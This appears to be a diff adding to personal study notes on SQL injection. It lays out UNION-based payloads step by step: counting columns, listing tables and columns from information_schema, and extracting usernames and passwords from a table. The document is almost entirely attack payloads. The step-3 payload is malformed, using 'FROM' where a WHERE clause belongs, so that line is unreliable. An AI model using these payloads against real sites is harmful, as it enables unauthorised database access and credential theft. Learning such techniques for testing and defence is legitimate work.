@@ -49,3 +49,21 @@ Answer: ' order by 1 (it's means 1 column exist)
 -- or # (Both are being used for comment out the content in MySQL and Microsoft SQL)
 
 ' UNION SELECT @@version, NULL#
+
+---------------How to find tables and columns through payload in SQL-----------
+
+1=> First verify the number of columns
+' UNION SELECT NULL,NULL--
+
+2=> Determine the tables
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+
+3=> Determine the columns
+' UNION SELECT column_name,NULL FROM information_schema.columns FROM table_name='user_abcd'--
+
+4=> Determine the username and password
+' UNION SELECT username, password FROM user_abcd--
+
+
+Step 2 will displays all database's tables through 'information_schema.tables' payload. Moreover, step 3 will do the same thing returns all columns. Lastly, Step 4 will return username and password
+from specific table.
